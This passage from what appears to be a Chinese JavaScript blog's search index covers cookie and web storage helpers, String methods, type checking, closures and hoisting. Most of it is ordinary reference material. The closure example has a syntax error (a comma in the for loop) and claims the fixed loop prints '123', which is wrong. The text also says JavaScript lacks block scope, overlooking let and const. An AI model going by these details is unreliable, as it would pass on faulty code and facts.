class="line">            cookieText += <span class="string">'; path='</span> + path;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (domain) &#123;</span><br><span class="line">            cookieText += <span class="string">'; domain='</span> + domain;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (secure) &#123;</span><br><span class="line">            cookieText += <span class="string">'; secure'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (HttpOnly) &#123;</span><br><span class="line">            cookieText += <span class="string">'; HttpOnly'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">document</span>.cookie = cookieText;</span><br><span class="line">    &#125;,</span><br><span class="line">    unset: <span class="function"><span class="keyword">function</span> (<span class="params">name, domain, path, secure, HttpOnly</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.set(name, <span class="string">''</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">0</span>), domain, path, secure, HttpOnly);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="cookie-与-sessionStorage-和-localStorage-的区别"><a href="#cookie-与-sessionStorage-和-localStorage-的区别" class="headerlink" title="cookie 与 sessionStorage 和 localStorage 的区别"></a>cookie 与 sessionStorage 和 localStorage 的区别</h4><h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><h6 id="数据的生命周期"><a href="#数据的生命周期" class="headerlink" title="数据的生命周期"></a>数据的生命周期</h6><p>cookie 可以设置失效时间，默认是关闭浏览器后失效</p>
<p>sessionStorage 仅在当前回话下有效，关闭标签或浏览器后失效</p>
<p>localStorage 除非手动清除，否则永久保存</p>
<h6 id="存储数据的大小"><a href="#存储数据的大小" class="headerlink" title="存储数据的大小"></a>存储数据的大小</h6><p>cookie 在 4kb 左右</p>
<p>sessionStorage 和 localStorage 在 5MB 左右，因浏览器而异</p>
<h6 id="与服务器端通讯"><a href="#与服务器端通讯" class="headerlink" title="与服务器端通讯"></a>与服务器端通讯</h6><p>cookie 会被携带在HTTP的请求头中，所以用cookie存储太多数据会带有性能问题</p>
<p>sessionStorage 和 localStorage 仅存在客户端，不参与服务器通讯</p>
<p>正因为 cookie 会参与服务器通讯，所以 storage 是不能取代 cookie 的，因为cookie是HTTP协议的一部分</p>
<h6 id="易用性"><a href="#易用性" class="headerlink" title="易用性"></a>易用性</h6><p>cookie 的原生接口不友好，需要手动封装读写操作</p>
<p>storage 的原生接口还是可以接受的</p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>storage在存储数据的时候，都是以字符串的形式进行保存的，所以无论你存储的是数字类型还是对象类型，当你读取的时候，你得到的将是该数据的字符串表示</p>
<h5 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h5><h6 id="cookie-的增删改查"><a href="#cookie-的增删改查" class="headerlink" title="cookie 的增删改查"></a>cookie 的增删改查</h6><p>cookie 的操作是对 document.cookie 的封装，前面我们已经讲过了。</p>
<h6 id="storage-的增删改查"><a href="#storage-的增删改查" class="headerlink" title="storage 的增删改查"></a>storage 的增删改查</h6><p>曾：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">localStorage.age = <span class="number">24</span></span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">localStorage.setItem(<span class="string">'age'</span>, <span class="number">24</span>)</span><br></pre></td></tr></table></figure>
<p>查：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">localStorage.age</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">localStorage.getItem(<span class="string">'age'</span>)</span><br></pre></td></tr></table></figure>
<p>改：</p>
<p>修改类似于增加，在原有的 <code>key</code> 上重新设置值就可以了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">localStorage.age = <span class="number">24</span></span><br><span class="line"><span class="comment">// 修改</span></span><br><span class="line">localStorage.age = <span class="number">30</span></span><br></pre></td></tr></table></figure>
<p>删：</p>
<p>删除全部存储的内容</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">localStorage.clear()</span><br></pre></td></tr></table></figure>
<p>删除某个键值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">localStorage.removeItem(<span class="string">'age'</span>)</span><br></pre></td></tr></table></figure>
<p>获取对应索引的键值：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">localStorage.key(index)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>cookie</tag>
        <tag>storage</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-字符串</title>
    <url>/2018/04/17/ECMA_%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="一、创建字符串"><a href="#一、创建字符串" class="headerlink" title="一、创建字符串"></a>一、创建字符串</h2><h4 id="字面量创建"><a href="#字面量创建" class="headerlink" title="字面量创建"></a>字面量创建</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'abc'</span></span><br></pre></td></tr></table></figure>
<h4 id="包装类型"><a href="#包装类型" class="headerlink" title="包装类型"></a>包装类型</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'abc'</span>)</span><br></pre></td></tr></table></figure>
<h4 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a>ES6模板字符串</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">`abc`</span></span><br></pre></td></tr></table></figure>
<h4 id="使用-String-fromCharCode-【ES6】String-fromCodePoint-将字符编码转成字符串"><a href="#使用-String-fromCharCode-【ES6】String-fromCodePoint-将字符编码转成字符串" class="headerlink" title="使用 String.fromCharCode() / 【ES6】String.fromCodePoint() 将字符编码转成字符串"></a>使用 String.fromCharCode() / 【ES6】String.fromCodePoint() 将字符编码转成字符串</h4><h2 id="二、字符串基本包装类型的方法"><a href="#二、字符串基本包装类型的方法" class="headerlink" title="二、字符串基本包装类型的方法"></a>二、字符串基本包装类型的方法</h2><h4 id="字符方法："><a href="#字符方法：" class="headerlink" title="字符方法："></a>字符方法：</h4><h6 id="str-charAt"><a href="#str-charAt" class="headerlink" title="str.charAt()"></a>str.charAt()</h6><ul>
<li>描述：访问字符串中特定位置的字符</li>
<li>参数：一个数字，表示字符串的位置</li>
<li>返回值：返回该位置的字符</li>
</ul>
<h6 id="str-charCodeAt"><a href="#str-charCodeAt" class="headerlink" title="str.charCodeAt()"></a>str.charCodeAt()</h6><ul>
<li>描述：功能用法与 charAt 相同，唯一不同的是，charCodeAt 返回的是字符编码而不是字符</li>
<li>返回值：字符编码</li>
</ul>
<h6 id="【ES6】str-codePointAt"><a href="#【ES6】str-codePointAt" class="headerlink" title="【ES6】str.codePointAt()"></a>【ES6】str.codePointAt()</h6><ul>
<li>描述：弥补 <code>charCodeAt</code> 不能正确处理需要4个字节表示的字符的缺陷，<code>codePointAt</code> 能够正确处理4个字节储存的字符，返回一个字符的码点。可以使用<code>codePointAt</code> 来检测一个字符是由两个字节组成，还是由4个字节组成</li>
<li>参数：一个数字，字符在字符串中的位置</li>
<li>返回值：字符编码</li>
</ul>
<h4 id="字符串操作方法"><a href="#字符串操作方法" class="headerlink" title="字符串操作方法"></a>字符串操作方法</h4><h6 id="str-concat"><a href="#str-concat" class="headerlink" title="str.concat()"></a>str.concat()</h6><ul>
<li>描述：连接多个字符串为一个字符串</li>
<li>参数：任意多个参数，要依次连接的字符串</li>
<li>返回值：新字符串</li>
<li>是否改变原字符串：否</li>
</ul>
<h6 id="str-slice"><a href="#str-slice" class="headerlink" title="str.slice()"></a>str.slice()</h6><h6 id="str-substr"><a href="#str-substr" class="headerlink" title="str.substr()"></a>str.substr()</h6><h6 id="str-substring"><a href="#str-substring" class="headerlink" title="str.substring()"></a>str.substring()</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">描述：上面三个方法都能基于已有字符串创建新字符串，但不会影响原字符串。</span><br><span class="line">参数：第一个参数：指定起始位置</span><br><span class="line">        如果传正数：三个函数行为相同</span><br><span class="line">        如果传负数：substring 会把负数转为0，相当于 substring(0)</span><br><span class="line">    第二个参数：可选</span><br><span class="line">        如果是正数：substr 指定的是返回字符串的数量，substring 和 slice 指定的是字符串的结束位置(返回字符串不包含该位置)</span><br><span class="line">        如果是负数：substr 和 substring 都会把负数变为0</span><br><span class="line">                    substring 会自动调整 0 的位置比如 【substring(3, 0) ==&gt;转化为==&gt; substring(0, 3)】</span><br><span class="line">返回值：新字符串</span><br><span class="line">是否改变原字符串：否</span><br></pre></td></tr></table></figure>
<h6 id="str-trim"><a href="#str-trim" class="headerlink" title="str.trim()"></a>str.trim()</h6><ul>
<li>描述：去掉字符串的前后空格</li>
<li>参数：无</li>
<li>返回值：新字符串</li>
<li>是否改变原字符串：否</li>
</ul>
<h6 id="str-toLowerCase"><a href="#str-toLowerCase" class="headerlink" title="str.toLowerCase()"></a>str.toLowerCase()</h6><h6 id="str-toUpperCase"><a href="#str-toUpperCase" class="headerlink" title="str.toUpperCase()"></a>str.toUpperCase()</h6><h6 id="str-toLocaleLowerCase"><a href="#str-toLocaleLowerCase" class="headerlink" title="str.toLocaleLowerCase()"></a>str.toLocaleLowerCase()</h6><h6 id="str-toLocaleUpperCase"><a href="#str-toLocaleUpperCase" class="headerlink" title="str.toLocaleUpperCase()"></a>str.toLocaleUpperCase()</h6><ul>
<li>描述：字符串转大小写</li>
<li>参数：无</li>
<li>返回值：转变后的字符串</li>
<li>是否改变原字符串：否</li>
</ul>
<h6 id="【ES6】str-repeat"><a href="#【ES6】str-repeat" class="headerlink" title="【ES6】str.repeat()"></a>【ES6】str.repeat()</h6><ul>
<li>描述：方法返回一个新字符串，表示将原字符串重复n次</li>
<li>参数：</li>
</ul>
<p>一个大于 <code>-1</code> 的数字，表示重复的次数(传递小于 <code>-1</code> 的数字会报错，传递小数会取整，之所以可以传递 -1 ~ 0 之间的数字是因为，-1 ~ 0之间的数字取整后都为0，并不会报错)</p>
<ul>
<li>返回值：新字符串</li>
<li>是否改变原字符串：否</li>
</ul>
<h6 id="【ES7】padStart"><a href="#【ES7】padStart" class="headerlink" title="【ES7】padStart()"></a>【ES7】padStart()</h6><h6 id="【ES7】padEnd"><a href="#【ES7】padEnd" class="headerlink" title="【ES7】padEnd()"></a>【ES7】padEnd()</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">描述：对字符串进行补全，padStart 前补全，padEnd 后补全</span><br><span class="line">参数：第一个参数：字符串的最小长度</span><br><span class="line">        第二个参数：可选，用来填充的字符串，默认用空格填充</span><br></pre></td></tr></table></figure>
<h4 id="字符串位置方法"><a href="#字符串位置方法" class="headerlink" title="字符串位置方法"></a>字符串位置方法</h4><h6 id="str-indexOf"><a href="#str-indexOf" class="headerlink" title="str.indexOf()"></a>str.indexOf()</h6><h6 id="str-lastIndexOf"><a href="#str-lastIndexOf" class="headerlink" title="str.lastIndexOf()"></a>str.lastIndexOf()</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">描述：从一个字符串中搜索子字符串，并返回子字符串第一次出现的位置（不同的是：indexOf 从前往后找， lastIndexOf 从后往前找）</span><br><span class="line">参数：第一个参数：要查找的子字符串</span><br><span class="line">        第二个参数：查找的起始位置</span><br><span class="line">返回值：子字符串第一次出现的位置，未找到返回-1</span><br><span class="line">是否改变原字符串：否</span><br></pre></td></tr></table></figure>
<h6 id="【ES6】str-includes"><a href="#【ES6】str-includes" class="headerlink" title="【ES6】str.includes()"></a>【ES6】str.includes()</h6><h6 id="【ES6】str-startsWith"><a href="#【ES6】str-startsWith" class="headerlink" title="【ES6】str.startsWith()"></a>【ES6】str.startsWith()</h6><h6 id="【ES6】str-endsWith"><a href="#【ES6】str-endsWith" class="headerlink" title="【ES6】str.endsWith()"></a>【ES6】str.endsWith()</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">描述：上面三个函数都是查找字符串中是否包含子字符串</span><br><span class="line">    str.includes() ：字符串是否包含子字符串</span><br><span class="line">    str.startsWith() ：字符串是否以子字符串开头</span><br><span class="line">    str.endsWith() ：字符串是否以子字符串结尾</span><br><span class="line">参数：第一个参数：子字符串</span><br><span class="line">        第二个参数：查找的起始位置【注意：给endsWith指定第二个参数n是，它指的是前n个字符】</span><br><span class="line">返回值：满足条件返回 true，否则返回 false</span><br></pre></td></tr></table></figure>
<h4 id="模式匹配方法"><a href="#模式匹配方法" class="headerlink" title="模式匹配方法"></a>模式匹配方法</h4><h6 id="str-match"><a href="#str-match" class="headerlink" title="str.match()"></a>str.match()</h6><ul>
<li>描述：通过模式匹配字符串</li>
<li>参数：字符串 / 正则表达式 / RegExp 对象</li>
<li>返回值：数组，数组的第一项是与整个模式匹配的项，后面的每一项保存着与正则表达式中的捕获组匹配的字符串</li>
</ul>
<h6 id="str-search"><a href="#str-search" class="headerlink" title="str.search()"></a>str.search()</h6><ul>
<li>描述：和 indexOf 功能相似，唯一不同的是：该方法支持正则</li>
<li>参数：字符串 / 正则表达式 / RegExp 对象</li>
<li>返回值：返回第一个匹配项的索引，没有找到返回 -1</li>
</ul>
<h6 id="str-replace"><a href="#str-replace" class="headerlink" title="str.replace()"></a>str.replace()</h6><ul>
<li>描述：通过模式替换匹配的字符串</li>
<li><p>参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一个参数：字符串 / 正则表达式</span><br><span class="line">第二个参数：字符串 / 函数</span><br><span class="line">    如果第二个参数是字符串：可以使用特殊的字符序列：</span><br><span class="line">        $$ =====&gt; $</span><br><span class="line">        $&amp; =====&gt; 匹配整个模式的字符串，与RegExp.lastMatch的值相同</span><br><span class="line">        $&apos; =====&gt; 匹配的子字符串之后的子字符串，与RegExp.rightContext的值相同</span><br><span class="line">        $` =====&gt; 匹配的子字符串之前的子字符串，与RegExp.leftContext的值相同</span><br><span class="line">        $n =====&gt; 匹配第n(0 ~ 9)个捕获组的子字符串，如果正则表达式中没有捕获组，则使用空字符串</span><br><span class="line">        $nn =====&gt; 匹配第nn(01 ~ 99)个捕获组的子字符串，如果正则表达式中没有捕获组，则使用空字符串</span><br><span class="line">    如果第二个参数是函数：(该函数接收的参数与正则表达式有关)</span><br><span class="line">        1、正则表达式只有一个匹配项，即无捕获组</span><br><span class="line">            该函数接收三个参数：第一个：模式的匹配项</span><br><span class="line">                                第二个：模式匹配项在字符串中的位置</span><br><span class="line">                                第三个：原始字符串</span><br><span class="line">        2、正则表达式中定义了多个捕获组</span><br><span class="line">            该函数接收参数如下：第一个：模式的匹配项</span><br><span class="line">                                第二个 ~ 第n个：第二个捕获组的匹配项 ~ 第n个捕获组的匹配项</span><br><span class="line">                                最后两个参数分别是：模式匹配项在字符串中的位置 和 原始字符串</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值：新字符串</p>
</li>
<li>是否改变原字符串：否</li>
</ul>
<h6 id="str-split"><a href="#str-split" class="headerlink" title="str.split()"></a>str.split()</h6><ul>
<li>描述：基于指定的字符或模式，将字符串分割成数组</li>
<li>参数：<ul>
<li>第一个参数：字符串 / 正则表达式</li>
<li>第二个参数：指定数组的长度</li>
</ul>
</li>
</ul>
<h4 id="字符串比较方法"><a href="#字符串比较方法" class="headerlink" title="字符串比较方法"></a>字符串比较方法</h4><h6 id="str1-localeCompare-str2"><a href="#str1-localeCompare-str2" class="headerlink" title="str1.localeCompare(str2)"></a>str1.localeCompare(str2)</h6><ul>
<li>描述：对两个字符串进行比较</li>
<li>参数：字符串</li>
<li>返回值：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果 str &gt; str2 ，返回 1</span><br><span class="line">如果 str = str2 ，返回 0</span><br><span class="line">如果 str &lt; str2 ，返回 -1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h6 id="【ES6】str1-normalize"><a href="#【ES6】str1-normalize" class="headerlink" title="【ES6】str1.normalize()"></a>【ES6】str1.normalize()</h6><ul>
<li>描述：ES6提供字符串实例的normalize()方法，用来将字符的不同表示方法统一为同样的形式，这称为Unicode正规化。</li>
<li>参数：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;NFC&apos; :</span><br><span class="line">默认参数，表示“标准等价合成”（Normalization Form Canonical Composition），返回多个简单字符的合成字符。所谓“标准等价”指的是视觉和语义上的等价。</span><br><span class="line"></span><br><span class="line">&apos;NFD&apos; :</span><br><span class="line">表示“标准等价分解”（Normalization Form Canonical Decomposition），即在标准等价的前提下，返回合成字符分解的多个简单字符。</span><br><span class="line">&apos;NFKC&apos; :</span><br><span class="line">表示“兼容等价合成”（Normalization Form Compatibility Composition），返回合成字符。所谓“兼容等价”指的是语义上存在等价，但视觉上不等价，比如“囍”和“喜喜”。（这只是用来举例，normalize方法不能识别中文。）</span><br><span class="line">&apos;NFKD&apos; :</span><br><span class="line">表示“兼容等价分解”（Normalization Form Compatibility Decomposition），即在兼容等价的前提下，返回合成字符分解的多个简单字符。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="String构造函数的静态方法"><a href="#String构造函数的静态方法" class="headerlink" title="String构造函数的静态方法"></a>String构造函数的静态方法</h4><h6 id="String-fromCharCode"><a href="#String-fromCharCode" class="headerlink" title="String.fromCharCode()"></a>String.fromCharCode()</h6><ul>
<li>描述：接受一至多个字符编码，然后将他们转换成一个字符串</li>
<li>参数：1 ~ n 个字符编码</li>
<li>返回值：字符串</li>
</ul>
<h6 id="【ES6】String-fromCodePoint"><a href="#【ES6】String-fromCodePoint" class="headerlink" title="【ES6】String.fromCodePoint()"></a>【ES6】String.fromCodePoint()</h6><ul>
<li>描述：接受一至多个字符编码，然后将他们转换成字符串，该方法弥补 <code>String.fromCharCode()</code> 方法不能识别字符编码大于0xFFFF的缺陷</li>
</ul>
<h4 id="字符串的其他扩展"><a href="#字符串的其他扩展" class="headerlink" title="字符串的其他扩展"></a>字符串的其他扩展</h4><p>ES6为字符串添加了遍历器接口(Iterator)，这个遍历器最大的优点是可以识别大于0xFFFF的码点，传统的 <code>for</code> 循环无法识别这样的码点。</p>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-变量</title>
    <url>/2018/04/17/ECMA_%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h2 id="一、变量类型"><a href="#一、变量类型" class="headerlink" title="一、变量类型"></a>一、变量类型</h2><h3 id="js的基本数据类型"><a href="#js的基本数据类型" class="headerlink" title="js的基本数据类型"></a>js的基本数据类型</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Undefined、Null、Boolean、Number、String、</span><br><span class="line">ECMAScript 2015 新增:Symbol(创建后独一无二且不可变的数据类型 )</span><br></pre></td></tr></table></figure>
<h3 id="变量类型区别"><a href="#变量类型区别" class="headerlink" title="变量类型区别"></a>变量类型区别</h3><p>栈：原始数据类型（<code>Undefined</code>，<code>Null</code>，<code>Boolean</code>，<code>Number</code>、<code>String</code>）<br><br>堆：引用数据类型（对象、数组和函数）</p>
<p class="tip">两种类型的区别是：存储位置不同；<br>原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储；<br>引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定。如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体</p>

<p><img src="http://ou3l58em5.bkt.clouddn.com/varHeap.gif" alt></p>
<h3 id="判断变量类型"><a href="#判断变量类型" class="headerlink" title="判断变量类型"></a>判断变量类型</h3><h4 id="1、typeof"><a href="#1、typeof" class="headerlink" title="1、typeof"></a>1、<code>typeof</code></h4><blockquote>
<p><code>typeof</code> 操作符返回的是类型字符串，它的返回值有6种取值：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="number">3</span> <span class="comment">// "number"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">"abc"</span> <span class="comment">// "string"</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;&#125; <span class="comment">// "object"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span> <span class="comment">// "boolean"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span> <span class="comment">// "undefined"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125; <span class="comment">// "function"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span> <span class="comment">// "object""</span></span><br><span class="line"><span class="keyword">typeof</span> [] <span class="comment">// "object"</span></span><br></pre></td></tr></table></figure>
<h4 id="2、instanceof"><a href="#2、instanceof" class="headerlink" title="2、instanceof"></a>2、<code>instanceof</code></h4><blockquote>
<p><code>instanceof</code>操作符用于检查某个对象的原型链是否包含某个构造函数的<code>prototype</code>属性。例如：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="keyword">instanceof</span> <span class="built_in">Array</span> <span class="comment">// true</span></span><br><span class="line">/abc/ <span class="keyword">instanceof</span> <span class="built_in">RegExp</span> <span class="comment">// true</span></span><br><span class="line">(&#123;&#125;) <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;) <span class="keyword">instanceof</span> <span class="built_in">Function</span> <span class="comment">// true</span></span><br><span class="line">(<span class="keyword">new</span> <span class="built_in">Date</span>) <span class="keyword">instanceof</span> <span class="built_in">Date</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>instanceof</code>对基本数据类型不起作用，因为基本数据类型没有原型链。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> <span class="keyword">instanceof</span> <span class="built_in">Number</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">true</span> <span class="keyword">instanceof</span> <span class="built_in">Boolean</span> <span class="comment">// false</span></span><br><span class="line"><span class="string">'abc'</span> <span class="keyword">instanceof</span> <span class="built_in">String</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> XXX  <span class="comment">// always false</span></span><br><span class="line"><span class="literal">undefined</span> <span class="keyword">instanceof</span> XXX  <span class="comment">// always false</span></span><br></pre></td></tr></table></figure>
<h4 id="3、toString"><a href="#3、toString" class="headerlink" title="3、toString"></a>3、<code>toString</code></h4><blockquote>
<p><code>toString</code>方法是最为可靠的类型检测手段，它会将当前对象转换为字符串并输出。 <code>toString</code>属性定义在<code>Object.prototype</code>上，因而所有对象都拥有<code>toString</code>方法。 但<code>Array</code>, <code>Date</code>等对象会重写从<code>Object.prototype</code>继承来的<code>toString</code>， 所以最好用<code>Object.prototype.toString</code>来检测类型。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">toString = <span class="built_in">Object</span>.prototype.toString;</span><br><span class="line"></span><br><span class="line">toString.call(<span class="keyword">new</span> <span class="built_in">Date</span>);    <span class="comment">// [object Date]</span></span><br><span class="line">toString.call(<span class="keyword">new</span> <span class="built_in">String</span>);  <span class="comment">// [object String]</span></span><br><span class="line">toString.call(<span class="built_in">Math</span>);        <span class="comment">// [object Math]</span></span><br><span class="line">toString.call(<span class="number">3</span>);           <span class="comment">// [object Number]</span></span><br><span class="line">toString.call([]);          <span class="comment">// [object Array]</span></span><br><span class="line">toString.call(&#123;&#125;);          <span class="comment">// [object Object]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Since JavaScript 1.8.5</span></span><br><span class="line">toString.call(<span class="literal">undefined</span>);   <span class="comment">// [object Undefined]</span></span><br><span class="line">toString.call(<span class="literal">null</span>);        <span class="comment">// [object Null]</span></span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><code>typeof</code>只能检测基本数据类型，对于<code>null</code>还有Bug；</li>
<li><code>instanceof</code>适用于检测对象，它是基于原型链运作的；</li>
<li><code>constructor</code>指向的是最初创建者，而且容易伪造，不适合做类型判断；</li>
<li><code>toString</code>适用于ECMA内置JavaScript类型（包括基本数据类型和内置对象）的类型判断；</li>
<li>基于引用判等的类型检查都有跨窗口问题，比如<code>instanceof</code>和<code>constructor</code>。</li>
</ul>
<p class="tip">总之，如果你要判断的是基本数据类型或JavaScript内置对象，使用<code>toString</code>； 如果要判断的时自定义类型，请使用<code>instanceof</code></p>

<ul>
<li>另外Duck Typing的方式也非常可行<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">isWindow:  <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj &amp;&amp; <span class="keyword">typeof</span> obj === <span class="string">'object'</span> &amp;&amp; <span class="string">"setInterval"</span> <span class="keyword">in</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="二、变量作用域"><a href="#二、变量作用域" class="headerlink" title="二、变量作用域"></a>二、变量作用域</h2><p>JavaScript语言提供了函数作用域，同时JavaScript允许嵌套的函数定义。 有趣的是，内部函数（inner function）的生命周期可能超过父级函数。 这时便会显示出JavaScript的一个特殊现象：闭包。 闭包为面向对象编程提供了另外一种有趣的封装方式，我们无需为私有变量声明<code>private</code>。</p>
<h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>程序设计语言中的作用域（scope）控制着变量和参数的可见性和生命周期。 它的重要性体现在避免命名冲突和自动内存管理两个方面，极大地减少了程序员的工作。<br>多数编程语言都拥有块作用域（block scope），由一对大括号限定其中变量的作用域。 比如C++的变量只在块内可见，变量被定义时执行内存申请和构造函数， 控制流退出代码块后内部的变量又被析构和内存回收。<br>不幸的是JavaScript提供了块语法，却不提供块作用域，而是提供函数作用域。 这意味着参数和变量在函数外部不可见，在函数内部始终可见。</p>
<h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>JavaScript允许在函数中嵌套定义函数，这意味着内部函数（inner function）也可以访问父级函数的上下文（包括参数和变量）。 有趣的是，有时内部函数拥有更长的生命周期。来一个典型的面试题：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>, i++) &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(i);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">f(); <span class="comment">// 333</span></span><br></pre></td></tr></table></figure></p>
<p><code>i</code>是<code>function f</code>中定义的变量，在传递给<code>setTimeout</code>的函数中，<code>i</code>仍然有效（其实它叫做闭包变量）。 所以1s后<code>console.log</code>时i仍然是<code>function f</code>中定义的那个<code>i</code>，这时它的值为<code>3</code>。</p>
<p>这意味着内部函数可以访问真正的外部变量，而不是外部变量的副本。 函数可以访问它被创建时的所有上下文变量，这就叫做闭包现象。</p>
<p>如果我们希望上述代码输出<code>123</code>，我们需要开启一个子作用域。而JavaScript只提供函数作用域，所以我们需要添加一层函数：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        !<span class="function"><span class="keyword">function</span> (<span class="params">i</span>) </span>&#123;</span><br><span class="line">            setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(i);</span><br><span class="line">            &#125;, <span class="number">1000</span>);</span><br><span class="line">        &#125;(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这时输出便是<code>123</code>了。其中的<code>!</code>是为了让JavaScript将这一句解析为表达式，而不是函数声明。 其实任何运算符都可以(<code>+-</code>），但如果没有便是语法错。</p>
<h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><p>一般编程语言建议将变量定义推迟，越晚越好。然而在JavaScript中不是这样， 应当将一切变量都在函数体最上方声明。例如：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = &#123;<span class="attr">name</span>: <span class="string">'harttle'</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(p.name);</span><br><span class="line">    <span class="keyword">var</span> p = &#123;<span class="attr">name</span>: <span class="string">'alice'</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上述代码将产生运行时错误：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Uncaught TypeError: Cannot read property &apos;name&apos; of undefined</span><br></pre></td></tr></table></figure></p>
